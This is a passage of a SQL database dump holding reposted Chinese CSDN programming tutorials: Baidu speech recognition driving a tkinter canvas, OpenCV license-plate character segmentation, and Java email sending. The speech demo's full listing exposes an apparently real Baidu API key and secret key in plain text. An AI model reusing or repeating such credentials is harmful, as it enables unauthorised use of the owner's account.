/>话说&mdash;&mdash;不靠AI扫雷，大家自己手动玩儿通关的有嘛？</p>\n<p>自动扫雷的、还有一款扫雷，这2款源码都可以找我拿去自己玩下的哈！</p>\n<p>免费获取源码项目:滴滴我即可啦！</p>\n<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「嗨！栗子同学」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/xy258009/article/details/121577674</p>', '', 6, ',5,', '原创', '公开', '已发布', '', 3, '', '', 0, '2021-12-05 20:30:37', '2021-12-05 20:30:37');
INSERT INTO `article` VALUES (7, '基于Python的语音识别控制系统', 7, '概述', '<p>基于Python的语音识别控制系统</p>\n<p>2021.12.03：本人是一名大三学生，学习人工智能的时候老师发布了一个语音识别控制图形移动的任务，参考了许多内容，写了一个小的程序，写出来分享给大家，如果能帮到你，倍感荣幸，祝你学习愉快！</p>\n<p>下面附上参考文章，这篇文章是通过识别出来的文字来打开浏览器中的默认网站。python通过调用百度api实现语音识别（超详细）_exmlyshy的博客-CSDN博客_python语音识别百度api</p>\n<p>题目很简单，利用语音识别识别说出来的文字，根据文字的内容来控制图形移动，例如说向上，识别出文字后，画布上的图形就会向上移动。本文使用的是百度识别API（因为免费），自己做的流程图：</p>\n<p>&nbsp;</p>\n<p>不多说，直接开始程序设计，首先登录百度云，创建应用</p>\n<p>&nbsp;</p>\n<p>注意这里的API Key和Secret Key，要用自己的才能生效</p>\n<p>百度语音识别有对应的文档，具体调用方法说的很清晰，如果想学习一下可以查看REST API文档</p>\n<p>文档写的很详细，本文只说明用到的方法，语音识别使用方法为组装URL获取token，然后处理本地音频以JSON格式发送到百度语音识别服务器，获得返回结果。</p>\n<p>百度语音识别支持pcm、wav等多种格式，百度服务端会将非pcm格式转成pcm格式，因此使用wav、amr格式会有额外的转换耗时。保存为pcm格式可以识别，只是windows自带播放器识别不了pcm格式的，所以改用wav格式，同时要引用wave库，功能为可读、写wav类型的音频文件。采样率使用了pcm采样率16000固定值，编码为16bit位深的单声道。</p>\n<p>&nbsp;</p>\n<p>录音函数中使用了PyAudio库，是Python下的一个音频处理模块，用于将音频流输送到计算机声卡上。在当前文件夹打开一个新的音频进行录音并存放录音数据。本地录音：</p>\n<p>def save_wave_file(filepath, data):<br />wf = wave.open(filepath, \'wb\')<br />wf.setnchannels(channels)<br />wf.setsampwidth(sampwidth)<br />wf.setframerate(framerate)<br />wf.writeframes(b\'\'.join(data))<br />wf.close()<br /><br /><br /># 录音<br />def my_record():<br />pa = PyAudio()<br /># 打开一个新的音频stream<br />stream = pa.open(format=paInt16, channels=channels,<br />rate=framerate, input=True, frames_per_buffer=num_samples)<br />my_buf = [] # 存放录音数据<br />t = time.time()<br />print(\'正在录音...\')<br />while time.time() &lt; t + 5: # 设置录音时间（秒）<br /># 循环read，每次read 2000frames<br />string_audio_data = stream.read(num_samples)<br />my_buf.append(string_audio_data)<br />print(\'录音结束.\')<br />save_wave_file(FILEPATH, my_buf)<br />stream.close()<br />然后是获取token，根据创建应用得到的APIKey和SecreKey（这里要使用自己的）来组装URL获取token。在语音识别函数中调用获取的token和已经录制好的音频数据，按照要求的格式来写进JSON参数进行上传音频。</p>\n<p>百度语音要求对本地语音二进制数据进行base64编码，使用base64库来进行编码。创建识别请求使用的是POST方式来进行提交，在识别函数中写入百度语音提供的短语音识别请求地址。识别结果会立刻返回，采用JSON格式进行封装，识别结果放在 JSON 的 &ldquo;result&rdquo; 字段中，统一采用 utf-8 方式编码。</p>\n<p># 组装url获取token<br />base_url = \"https://openapi.baidu.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=%s&amp;client_secret=%s\"<br />APIKey = \"*****************\"<br />SecretKey = \"********************\"<br />HOST = base_url % (APIKey, SecretKey)<br /><br /><br />def getToken(host):<br />res = requests.post(host)<br />r = res.json()[\'access_token\']<br />return r<br /><br /><br /># 传入语音二进制数据，token<br /># dev_pid为百度语音识别提供的几种语言选择，默认1537为有标点普通话<br />def speech2text(speech_data, token, dev_pid=1537):<br />FORMAT = \'wav\'<br />RATE = \'16000\'<br />CHANNEL = 1<br />CUID = \'*******\'<br />SPEECH = base64.b64encode(speech_data).decode(\'utf-8\')<br />data = {<br />\'format\': FORMAT,<br />\'rate\': RATE,<br />\'channel\': CHANNEL,<br />\'cuid\': CUID,<br />\'len\': len(speech_data),<br />\'speech\': SPEECH,<br />\'token\': token,<br />\'dev_pid\': dev_pid<br />}<br />url = \'https://vop.baidu.com/server_api\' # 短语音识别请求地址<br />headers = {\'Content-Type\': \'application/json\'}<br />print(\'正在识别...\')<br />r = requests.post(url, json=data, headers=headers)<br />Result = r.json()<br />if \'result\' in Result:<br />return Result[\'result\'][0]<br />else:<br />return Result<br />最后我们编写控制移动函数，首先我们要知道如何来把控制图形移动来呈现出来。本项目中我们使用的是tkinter模块，Tkinter是一个python模块，是一个调用Tcl/Tk的接口，它是一个跨平台的脚本图形界面接口。是一个比较流行的python图形编程接口。最大的特点是跨平台，缺点是性能不太好，执行速度慢。</p>\n<p>我们利用tkinter中的canvas来设置一个画布，并创建一个事件ID为1的矩形，把矩形放在画布中显示。在画布中添加Button按钮，回调中写入对应的函数，点击触发录制音频和语音识别。为了使代码更加简洁，我们把移动函数放在语音识别函数中调用，返回识别结果后对结果做出判断，最后使图形进行移动。</p>\n<p>def move(result):<br />print(result)<br />if \"向上\" in result:<br />canvas.move(1, 0, -30) # 移动的是 ID为1的事物【move（2,0,-5）则移动ID为2的事物】，使得横坐标加0，纵坐标减30<br />elif \"向下\" in result:<br />canvas.move(1, 0, 30)<br />elif \"向左\" in result:<br />canvas.move(1, -30, 0)<br />elif \"向右\" in result:<br />canvas.move(1, 30, 0)<br /><br /><br />tk = Tk()<br />tk.title(\"语音识别控制图形移动\")<br />Button(tk, text=\"开始录音\", command=AI.my_record).pack()<br />Button(tk, text=\"开始识别\", command=speech2text).pack()<br />canvas = Canvas(tk, width=500, height=500) # 设置画布<br />canvas.pack() # 显示画布<br />r = canvas.create_rectangle(180, 180, 220, 220, fill=\"red\") # 事件ID为1<br />mainloop()<br />个人习惯，我把语音识别和图形控制写在了两个文件里，这就导致main.py文件中没有办法使用AI.py文件函数中的返回值，因为我们使用的tkinter模块是不断循坏的，通过mainloop（）才能结束循环，这样不断循坏就调用不了返回值，使用的方法是在main.py中重新构建一样函数来调用AI.py文件中的函数，并声明全局变量，把AI.py文件中的返回值放在main.py文件的全局变量中，这样就得到了返回值，再将函数写到Button回调中就实现了对应的功能。</p>\n<p>其实代码写的十分麻烦，写在一个文件里会简单些，我画了两个文件的调用关系：</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>完整demo如下</p>\n<p>AI.py</p>\n<p>import wave # 可读、写wav类型的音频文件。<br />import requests # 基于urllib，采⽤Apache2 Licensed开源协议的 HTTP 库。在本项目中用于传递headers和POST请求<br />import time<br />import base64 # 百度语音要求对本地语音二进制数据进行base64编码<br />from pyaudio import PyAudio, paInt16 # 音频处理模块，用于将音频流输送到计算机声卡上<br /><br />framerate = 16000 # 采样率<br />num_samples = 2000 # 采样点<br />channels = 1 # 声道<br />sampwidth = 2 # 采样宽度2bytes<br />FILEPATH = \'speech.wav\'<br /><br /># 组装url获取token<br />base_url = \"https://openapi.baidu.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=%s&amp;client_secret=%s\"<br />APIKey = \"8bv3inF5roWBtEXYpZViCs39\"<br />SecretKey = \"HLXYiLGCpeOD6ddF1m6BvwcDZVOYtwwD\"<br />HOST = base_url % (APIKey, SecretKey)<br /><br /><br />def getToken(host):<br />res = requests.post(host)<br />r = res.json()[\'access_token\']<br />return r<br /><br /><br />def save_wave_file(filepath, data):<br />wf = wave.open(filepath, \'wb\')<br />wf.setnchannels(channels)<br />wf.setsampwidth(sampwidth)<br />wf.setframerate(framerate)<br />wf.writeframes(b\'\'.join(data))<br />wf.close()<br /><br /><br /># 录音<br />def my_record():<br />pa = PyAudio()<br /># 打开一个新的音频stream<br />stream = pa.open(format=paInt16, channels=channels,<br />rate=framerate, input=True, frames_per_buffer=num_samples)<br />my_buf = [] # 存放录音数据<br />t = time.time()<br />print(\'正在录音...\')<br />while time.time() &lt; t + 5: # 设置录音时间（秒）<br /># 循环read，每次read 2000frames<br />string_audio_data = stream.read(num_samples)<br />my_buf.append(string_audio_data)<br />print(\'录音结束.\')<br />save_wave_file(FILEPATH, my_buf)<br />stream.close()<br /><br /><br />def get_audio(file):<br />with open(file, \'rb\') as f:<br />data = f.read()<br />return data<br /><br /><br /># 传入语音二进制数据，token<br /># dev_pid为百度语音识别提供的几种语言选择，默认1537为有标点普通话<br />def speech2text(speech_data, token, dev_pid=1537):<br />FORMAT = \'wav\'<br />RATE = \'16000\'<br />CHANNEL = 1<br />CUID = \'*******\'<br />SPEECH = base64.b64encode(speech_data).decode(\'utf-8\')<br />data = {<br />\'format\': FORMAT,<br />\'rate\': RATE,<br />\'channel\': CHANNEL,<br />\'cuid\': CUID,<br />\'len\': len(speech_data),<br />\'speech\': SPEECH,<br />\'token\': token,<br />\'dev_pid\': dev_pid<br />}<br />url = \'https://vop.baidu.com/server_api\' # 短语音识别请求地址<br />headers = {\'Content-Type\': \'application/json\'}<br />print(\'正在识别...\')<br />r = requests.post(url, json=data, headers=headers)<br />Result = r.json()<br />if \'result\' in Result:<br />return Result[\'result\'][0]<br />else:<br />return Result<br />main.py</p>\n<p>import AI<br />from tkinter import * # 导入tkinter模块的所有内容<br /><br />token = None<br />speech = None<br />result = None<br /><br /><br />def getToken():<br />temptoken = AI.getToken(AI.HOST)<br />return temptoken<br /><br /><br />def speech2text():<br />global token<br />if token is None:<br />token = getToken()<br />speech = AI.get_audio(AI.FILEPATH)<br />result = AI.speech2text(speech, token, dev_pid=1537)<br />print(result)<br />move(result)<br /><br /><br />def move(result):<br />print(result)<br />if \"向上\" in result:<br />canvas.move(1, 0, -30) # 移动的是 ID为1的事物【move（2,0,-5）则移动ID为2的事物】，使得横坐标加0，纵坐标减30<br />elif \"向下\" in result:<br />canvas.move(1, 0, 30)<br />elif \"向左\" in result:<br />canvas.move(1, -30, 0)<br />elif \"向右\" in result:<br />canvas.move(1, 30, 0)<br /><br /><br />tk = Tk()<br />tk.title(\"语音识别控制图形移动\")<br />Button(tk, text=\"开始录音\", command=AI.my_record).pack()<br />Button(tk, text=\"开始识别\", command=speech2text).pack()<br />canvas = Canvas(tk, width=500, height=500) # 设置画布<br />canvas.pack() # 显示画布<br />r = canvas.create_rectangle(180, 180, 220, 220, fill=\"red\") # 事件ID为1<br />mainloop()<br />文件关系</p>\n<p>&nbsp;</p>\n<p>录制的音频会自动保存在当前文件夹下，就是speech文件</p>\n<p>测试结果，运行</p>\n<p>&nbsp;</p>\n<p>点击开始录音</p>\n<p>&nbsp;</p>\n<p>点击开始识别</p>\n<p>&nbsp;</p>\n<p>然后可以看到图形往右移动</p>\n<p>&nbsp;</p>\n<p>经测试，大吼效果更佳<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「兰斯洛特.」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/weixin_45973679/article/details/121709190</p>', '', 7, ',5,6,18,', '原创', '公开', '已发布', '', 1651, 'Hot', '', 0, '2021-12-05 20:39:50', '2021-12-05 20:39:50');
INSERT INTO `article` VALUES (8, 'OpenCV+Python实现将车牌数字分割为单个的字符图片', 6, '概述', '<p>文章目录<br />一、实现代码<br />1.图片预处理<br />读取图片<br />处理车牌上的螺丝<br />转灰度<br />二值化<br />闭运算<br />找字符边界<br />绘制边界<br />预处理效果<br />2.切割字符<br />预处理图转灰度<br />计算每一列的黑色和白色数量以及最大值<br />定义找右边界函数<br />切割字符以及保存切割结果到文件<br />切割结果<br />3.源代码<br />二、原数据<br />三、最终结果<br />四、总结<br />五、参考<br />一、实现代码<br />1.图片预处理<br />读取图片<br /># 车牌路径<br />file_path=\"./car/\"<br /># 读取所有车牌<br />cars = os.listdir(file_path)<br />cars.sort()</p>\n<p>src = cv2.imread(file_path+car)<br />img = src.copy()<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8</p>\n<p><br />处理车牌上的螺丝<br />用蓝色覆盖,后面二值化的时候可以直接去除</p>\n<p>cv2.circle(img, (145, 20), 10, (255, 0, 0), thickness=-1)<br />cv2.circle(img, (430, 20), 10, (255, 0, 0), thickness=-1)<br />cv2.circle(img, (145, 170), 10, (255, 0, 0), thickness=-1)<br />cv2.circle(img, (430, 170), 10, (255, 0, 0), thickness=-1)<br />cv2.circle(img, (180, 90), 10, (255, 0, 0), thickness=-1)<br />1<br />2<br />3<br />4<br />5</p>\n<p><br />转灰度<br />gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)<br />1</p>\n<p><br />二值化<br /># 二值化<br />adaptive_thresh = cv2.adaptiveThreshold(gray, 255, cv2.ADAPTIVE_THRESH_MEAN_C, cv2.THRESH_BINARY_INV, 333, 1)<br />1<br />2</p>\n<p><br />闭运算<br />除去螺丝痕迹</p>\n<p>kernel = np.ones((5, 5), int)<br />morphologyEx = cv2.morphologyEx(adaptive_thresh, cv2.MORPH_CLOSE, kernel)<br />1<br />2</p>\n<p><br />找字符边界<br />contours, hierarchy = cv2.findContours(morphologyEx, cv2.RETR_LIST, cv2.CHAIN_APPROX_SIMPLE)<br />1<br />绘制边界<br />用黑色把原来图片的蓝底换成黑底</p>\n<p>img_1 = img.copy()<br />cv2.drawContours(img_1, contours, -1, (0, 0, 0), -1)<br />1<br />2</p>\n<p><br />预处理效果</p>\n<p><br />2.切割字符<br />预处理图转灰度<br />gray_1 = cv2.cvtColor(img_1, cv2.COLOR_BGR2GRAY)<br />1<br />计算每一列的黑色和白色数量以及最大值<br /># 每一列的白色数量<br />white = []<br /># 每一列的黑色数量<br />black = []<br /># 区域高度取决于图片高<br />height = gray_1.shape[0]<br /># 区域宽度取决于图片宽<br />width = gray_1.shape[1]<br /># 最大白色数量<br />white_max = 0<br /># 最大黑色数量<br />black_max = 0<br /># 计算每一列的黑白色像素总和<br />for i in range(width):<br />s = 0 # 这一列白色总数<br />t = 0 # 这一列黑色总数<br />for j in range(height):<br />if gray_1[j][i] == 255:<br />s += 1<br />if gray_1[j][i] == 0:<br />t += 1<br />white_max = max(white_max, s)<br />black_max = max(black_max, t)<br />white.append(s)<br />black.append(t)<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />定义找右边界函数<br />def find_end(start):<br />end = start + 1<br />for m in range(start + 1, width - 1):<br /># 基本全黑的列视为边界<br />if black[m] &gt;= black_max * 0.95: # 0.95这个参数请多调整，对应下面的0.05<br />end = m<br />break<br />return end<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />切割字符以及保存切割结果到文件<br /># 临时变量<br />n = 1</p>\n<p># 起始位置<br />start = 1</p>\n<p># 结束位置<br />end = 2</p>\n<p># 分割结果数量<br />num=0</p>\n<p># 分割结果<br />res = []</p>\n<p># 保存分割结果路径,以图片名命名<br />output_path= output_dir + car.split(\'.\')[0]<br />if not os.path.exists(output_path):<br />os.makedirs(output_path)<br /># 从左边网右边遍历<br />while n &lt; width - 2:<br />n += 1</p>\n<p># 找到白色即为确定起始地址<br /># 不可以直接 white[n] &gt; white_max<br />if white[n] &gt; 0.05 * white_max:<br />start = n<br /># 找到结束坐标<br />end = find_end(start)<br /># 下一个的起始地址<br />n = end</p>\n<p># 确保找到的是符合要求的,过小不是车牌号<br />if end - start &gt; 10:<br /># 分割<br />char = gray_1[1:height, start - 5:end + 5]<br /># 保存分割结果到文件<br />cv2.imwrite(output_path+\'/\' + str(num) + \'.jpg\',char)<br />num+=1<br /># 重新绘制大小<br />char = cv2.resize(char, (300, 300), interpolation=cv2.INTER_CUBIC)<br /># 添加到结果集合<br />res.append(char)</p>\n<p>1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />切割结果</p>\n<p><br />3.源代码<br />import cv2<br />import numpy as np<br />import os<br />def stackImages(scale, imgArray):<br />\"\"\"<br />将多张图像压入同一个窗口显示<br />:param scale:float类型，输出图像显示百分比，控制缩放比例，0.5=图像分辨率缩小一半<br />:param imgArray:元组嵌套列表，需要排列的图像矩阵<br />:return:输出图像<br />\"\"\"<br />rows = len(imgArray)<br />cols = len(imgArray[0])</p>\n<p>rowsAvailable = isinstance(imgArray[0], list)</p>\n<p># 用空图片补齐<br />for i in range(rows):<br />tmp = cols - len(imgArray[i])<br />for j in range(tmp):<br />img = np.zeros((imgArray[0][0].shape[0], imgArray[0][0].shape[1]), dtype=\'uint8\')<br />imgArray[i].append(img)</p>\n<p># 判断维数<br />if rows&gt;=2:<br />width = imgArray[0][0].shape[1]<br />height = imgArray[0][0].shape[0]</p>\n<p>else:<br />width = imgArray[0].shape[1]<br />height = imgArray[0].shape[0]</p>\n<p>if rowsAvailable:<br />for x in range(0, rows):<br />for y in range(0, cols):<br />if imgArray[x][y].shape[:2] == imgArray[0][0].shape[:2]:<br />imgArray[x][y] = cv2.resize(imgArray[x][y], (0, 0), None, scale, scale)<br />else:<br />imgArray[x][y] = cv2.resize(imgArray[x][y], (imgArray[0][0].shape[1], imgArray[0][0].shape[0]),<br />None, scale, scale)<br />if len(imgArray[x][y].shape) == 2:<br />imgArray[x][y] = cv2.cvtColor(imgArray[x][y], cv2.COLOR_GRAY2BGR)<br />imageBlank = np.zeros((height, width, 3), np.uint8)<br />hor = [imageBlank] * rows<br />hor_con = [imageBlank] * rows<br />for x in range(0, rows):<br />hor[x] = np.hstack(imgArray[x])<br />ver = np.vstack(hor)<br />else:<br />for x in range(0, rows):<br />if imgArray[x].shape[:2] == imgArray[0].shape[:2]:<br />imgArray[x] = cv2.resize(imgArray[x], (0, 0), None, scale, scale)<br />else:<br />imgArray[x] = cv2.resize(imgArray[x], (imgArray[0].shape[1], imgArray[0].shape[0]), None, scale, scale)<br />if len(imgArray[x].shape) == 2: imgArray[x] = cv2.cvtColor(imgArray[x], cv2.COLOR_GRAY2BGR)<br />hor = np.hstack(imgArray)<br />ver = hor<br />return ver<br /># 分割结果输出路径<br />output_dir = \"./output/\"<br /># 车牌路径<br />file_path=\"./car/\"<br /># 读取所有车牌<br />cars = os.listdir(file_path)<br />cars.sort()</p>\n<p># 循环操作每一张车牌<br />for car in cars:<br /># 读取图片<br />print(\"正在处理\"+file_path+car)<br />src = cv2.imread(file_path+car)<br />img = src.copy()</p>\n<p># 预处理去除螺丝点<br />cv2.circle(img, (145, 20), 10, (255, 0, 0), thickness=-1)<br />cv2.circle(img, (430, 20), 10, (255, 0, 0), thickness=-1)<br />cv2.circle(img, (145, 170), 10, (255, 0, 0), thickness=-1)<br />cv2.circle(img, (430, 170), 10, (255, 0, 0), thickness=-1)<br />cv2.circle(img, (180, 90), 10, (255, 0, 0), thickness=-1)</p>\n<p># 转灰度<br />gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</p>\n<p># 二值化<br />adaptive_thresh = cv2.adaptiveThreshold(gray, 255, cv2.ADAPTIVE_THRESH_MEAN_C, cv2.THRESH_BINARY_INV, 333, 1)</p>\n<p># 闭运算<br />kernel = np.ones((5, 5), int)<br />morphologyEx = cv2.morphologyEx(adaptive_thresh, cv2.MORPH_CLOSE, kernel)</p>\n<p># 找边界<br />contours, hierarchy = cv2.findContours(morphologyEx, cv2.RETR_LIST, cv2.CHAIN_APPROX_SIMPLE)</p>\n<p># 画边界<br />img_1 = img.copy()<br />cv2.drawContours(img_1, contours, -1, (0, 0, 0), -1)</p>\n<p>imgStack = stackImages(0.7, ([src, img, gray], [adaptive_thresh, morphologyEx, img_1]))<br />cv2.imshow(\"imgStack\", imgStack)<br />cv2.waitKey(0)</p>\n<p># 转灰度为了方便切割<br />gray_1 = cv2.cvtColor(img_1, cv2.COLOR_BGR2GRAY)</p>\n<p># 每一列的白色数量<br />white = []<br /># 每一列的黑色数量<br />black = []<br /># 区域高度取决于图片高<br />height = gray_1.shape[0]<br /># 区域宽度取决于图片宽<br />width = gray_1.shape[1]<br /># 最大白色数量<br />white_max = 0<br /># 最大黑色数量<br />black_max = 0<br /># 计算每一列的黑白色像素总和<br />for i in range(width):<br />s = 0 # 这一列白色总数<br />t = 0 # 这一列黑色总数<br />for j in range(height):<br />if gray_1[j][i] == 255:<br />s += 1<br />if gray_1[j][i] == 0:<br />t += 1<br />white_max = max(white_max, s)<br />black_max = max(black_max, t)<br />white.append(s)<br />black.append(t)</p>\n<p><br /># 找到右边界<br />def find_end(start):<br />end = start + 1<br />for m in range(start + 1, width - 1):<br /># 基本全黑的列视为边界<br />if black[m] &gt;= black_max * 0.95: # 0.95这个参数请多调整，对应下面的0.05<br />end = m<br />break<br />return end</p>\n<p><br /># 临时变量<br />n = 1</p>\n<p># 起始位置<br />start = 1</p>\n<p># 结束位置<br />end = 2</p>\n<p># 分割结果数量<br />num=0</p>\n<p># 分割结果<br />res = []</p>\n<p># 保存分割结果路径,以图片名命名<br />output_path= output_dir + car.split(\'.\')[0]<br />if not os.path.exists(output_path):<br />os.makedirs(output_path)<br /># 从左边网右边遍历<br />while n &lt; width - 2:<br />n += 1</p>\n<p># 找到白色即为确定起始地址<br /># 不可以直接 white[n] &gt; white_max<br />if white[n] &gt; 0.05 * white_max:<br />start = n<br /># 找到结束坐标<br />end = find_end(start)<br /># 下一个的起始地址<br />n = end</p>\n<p># 确保找到的是符合要求的,过小不是车牌号<br />if end - start &gt; 10:<br /># 分割<br />char = gray_1[1:height, start - 5:end + 5]<br /># 保存分割结果到文件<br />cv2.imwrite(output_path+\'/\' + str(num) + \'.jpg\',char)<br />num+=1<br /># 重新绘制大小<br />char = cv2.resize(char, (300, 300), interpolation=cv2.INTER_CUBIC)<br /># 添加到结果集合<br />res.append(char)</p>\n<p># cv2.imshow(\"imgStack\", char)<br /># cv2.waitKey(0)</p>\n<p># 构造结果元祖方便结果展示<br />res2 = (res[:2], res[2:4], res[4:6], res[6:])<br /># 显示结果<br />imgStack = stackImages(0.5, res2)<br />cv2.imshow(\"imgStack\", imgStack)<br />cv2.waitKey(0)</p>\n<p>&nbsp;</p>\n<p><br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />49<br />50<br />51<br />52<br />53<br />54<br />55<br />56<br />57<br />58<br />59<br />60<br />61<br />62<br />63<br />64<br />65<br />66<br />67<br />68<br />69<br />70<br />71<br />72<br />73<br />74<br />75<br />76<br />77<br />78<br />79<br />80<br />81<br />82<br />83<br />84<br />85<br />86<br />87<br />88<br />89<br />90<br />91<br />92<br />93<br />94<br />95<br />96<br />97<br />98<br />99<br />100<br />101<br />102<br />103<br />104<br />105<br />106<br />107<br />108<br />109<br />110<br />111<br />112<br />113<br />114<br />115<br />116<br />117<br />118<br />119<br />120<br />121<br />122<br />123<br />124<br />125<br />126<br />127<br />128<br />129<br />130<br />131<br />132<br />133<br />134<br />135<br />136<br />137<br />138<br />139<br />140<br />141<br />142<br />143<br />144<br />145<br />146<br />147<br />148<br />149<br />150<br />151<br />152<br />153<br />154<br />155<br />156<br />157<br />158<br />159<br />160<br />161<br />162<br />163<br />164<br />165<br />166<br />167<br />168<br />169<br />170<br />171<br />172<br />173<br />174<br />175<br />176<br />177<br />178<br />179<br />180<br />181<br />182<br />183<br />184<br />185<br />186<br />187<br />188<br />189<br />190<br />191<br />192<br />193<br />194<br />195<br />196<br />197<br />198<br />二、原数据</p>\n<p><br />三、最终结果</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p><br />四、总结<br />图片预处理对于后面图像的分析有很大的影响</p>\n<p>五、参考<br />https://blog.csdn.net/m0_38024433/article/details/78650024<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「醉意丶千层梦」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/qq_47281915/article/details/121705585</p>', '', 8, ',5,', '原创', '公开', '已发布', '', 8, 'Hot', '', 0, '2021-12-05 20:41:04', '2021-12-05 20:41:04');
INSERT INTO `article` VALUES (9, '如何用java实现发邮件功能', 6, '概述', '<p>如何用java实现发邮件功能<br />前言<br />前置条件<br />邮件服务器<br />电子邮件协议<br />JavaMail<br />实现<br />参考<br />前言<br />今天突然心学来潮，想用Java来实现发邮件的功能，想想这个在实际中还是蛮有用的，比如我举几个例子哈：</p>\n<p>常见的如在某网站注册了一个账户，自动发送一封激活邮件，通过邮件找回密码，自动批量发送活动信息等。</p>\n<p>设置一个定时任务，然后需要定期反馈，如果可以适时的将状态发给自己的邮箱，是不是很令人期待哇。</p>\n<p>今天我们就一起来实现这个功能～</p>\n<p>前置条件<br />邮件服务器<br />邮件服务器是一种用来负责电子邮件收发管理的设备，类似于web服务器（如Tomcat）、数据库服务器（如MySql)，把一台邮件服务器端软件放在网络上，即可供广大网络用户使用。</p>\n<p>电子邮件协议<br />首先，什么是电子邮件协议呢？常用的电子邮件协议包括 SMTP，POP3，IMAP。其中邮件的创建和发送只需要用到 SMTP协议，SMTP 的全称是&ldquo;Simple Mail Transfer Protocol&rdquo;，即简单邮件传输协议。它是一组用于从源地址到目的地址传输邮件的规范，通过它来控制邮件的中转方式。SMTP 协议属于 TCP/IP 协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。</p>\n<p>SMTP 服务器就是遵循 SMTP 协议的发送邮件服务器。<br />POP3（收取邮件协议，默认端口110，不能在线操作）<br />IMAP（收取邮件协议，默认端口143，运行在TCP/IP协议之上，与POP3的主要区别：可以在线操作）<br />JavaMail<br />JavaMail它是Sun发布的用来处理email的API。它可以方便地执行一些常用的邮件传输。写 JavaMail 程序就是编写邮件客户端程序（类似于 outlook、foxmail 等邮件客户端）。这也是本文重点要用到的东西，下面就来具体实现了。</p>\n<p>实现<br />1.准备好一个发件邮箱和收件邮箱来测试（我是选择的163邮箱作为发件邮箱(需要设置SMTP)，qq邮箱作为收件邮箱）</p>\n<p>2.引入pom文件</p>\n<p>&lt;dependency&gt;<br />&lt;groupId&gt;javax.mail&lt;/groupId&gt;<br />&lt;artifactId&gt;mail&lt;/artifactId&gt;<br />&lt;version&gt;1.4.7&lt;/version&gt;<br />&lt;/dependency&gt;<br />1<br />2<br />3<br />4<br />5<br />3.java代码</p>\n<p><br />import javax.mail.*;<br />import javax.mail.internet.InternetAddress;<br />import javax.mail.internet.MimeMessage;<br />import java.util.Properties;</p>\n<p>public class Test {<br />private static final String USEREMAAL = \"填你自己邮箱\"; // 发件人称号，同邮箱地址<br />private static final String PASSWORD = \"填写刚才获得的授权码\"; // 可以使户端授权码</p>\n<p>public static boolean sendMail(String to, String text, String title){<br />try {<br />final Properties props = new Properties();<br />props.put(\"mail.smtp.auth\", \"true\");<br />props.put(\"mail.smtp.host\", \"smtp.qq.com\");<br />props.put(\"mail.user\", USEREMAAL);<br />props.put(\"mail.password\", PASSWORD);</p>\n<p>// 构建授权信息，用于进行SMTP进行身份验证<br />Authenticator authenticator = new Authenticator() {<br />@Override<br />protected PasswordAuthentication getPasswordAuthentication() {<br />// 用户名、密码<br />String userName = props.getProperty(\"mail.user\");<br />String password = props.getProperty(\"mail.password\");<br />return new PasswordAuthentication(userName, password);<br />}<br />};<br />// 使用环境属性和授权信息，创建邮件会话<br />Session mailSession = Session.getInstance(props, authenticator);<br />// 创建邮件消息<br />MimeMessage message = new MimeMessage(mailSession);<br />// 设置发件人<br />String username = props.getProperty(\"mail.user\");<br />InternetAddress form = new InternetAddress(username);<br />message.setFrom(form);</p>\n<p>// 设置收件人<br />InternetAddress toAddress = new InternetAddress(to);<br />message.setRecipient(Message.RecipientType.TO, toAddress);</p>\n<p>// 设置邮件标题<br />message.setSubject(title);</p>\n<p>// 设置邮件的内容体<br />message.setContent(text, \"text/html;charset=UTF-8\");<br />// 发送邮件<br />Transport.send(message);<br />return true;<br />}catch (Exception e){<br />e.printStackTrace();<br />}<br />return false;<br />}</p>\n<p>public static void main(String[] args) throws Exception { <br />MailUtils.sendMail(\"xxx@qq.com\",\"test\",\"测试邮件\");<br />System.out.println(\"===发送成功====\");<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />49<br />50<br />51<br />52<br />53<br />54<br />55<br 